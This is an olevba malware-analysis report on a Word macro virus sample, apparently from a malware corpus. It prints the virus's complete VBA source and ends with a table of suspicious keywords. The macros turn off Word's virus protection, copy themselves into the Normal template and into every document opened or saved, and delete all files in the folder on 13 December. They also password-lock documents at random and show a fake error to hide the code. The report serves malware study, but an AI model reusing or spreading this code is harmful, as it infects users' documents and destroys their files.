olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Af.b-ae38b4a8d4012b6f2b1fe909e3b2f92451f9627a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Af.b-ae38b4a8d4012b6f2b1fe909e3b2f92451f9627a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO AtomicF97.bas 
in file: Virus.MSWord.Af.b-ae38b4a8d4012b6f2b1fe909e3b2f92451f9627a - OLE stream: 'Macros/VBA/AtomicF97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Atom()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo KillError
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 5)
If D$ = "13/12" Then
    Kill "*.*"
End If
KillError:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorInfectGlobalTemplate
If (CheckInfected = 0) Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AtomicF97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserFormM", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserFormT", Object:=wdOrganizerObjectProjectItems
    MsgBox "Atomic Virus est de retour!!!!!", Title:="AtomicF97"
End If
Call Atom
ErrorInfectGlobalTemplate:
End Sub
Function CheckInfected()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
CheckInfected = 0
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
If WordBasic.[MacroName$](i, 0) = "Atomic97" Then
    CheckInfected = -1
End If
Next i
End Function
Sub FileOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo InfError
    Dialogs(wdDialogFileOpen).Show
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AtomicF97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserFormM", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserFormT", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
InfError:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AtomicF97", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserFormM", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserFormT", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Dim MyTime
MyTime = Time
T$ = Mid(MyTime, 7, 8)
MsgBox T$
Stop
If T$ = "13" Then
Randomize
N$ = Int(Rnd * 10) + 1
Select Case N$
    Case 1, 2, 3, 4, 5
    ActiveDocument.SaveAs Password:=ActiveDocument.Name
    ActiveDocument.Save
    Case 6, 7, 8, 9, 10
    ActiveDocument.SaveAs Password:=Application.UserName
    ActiveDocument.Save
End Select
End If
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    UserFormT.Show
    Beep
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    UserFormM.Show
    Beep
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

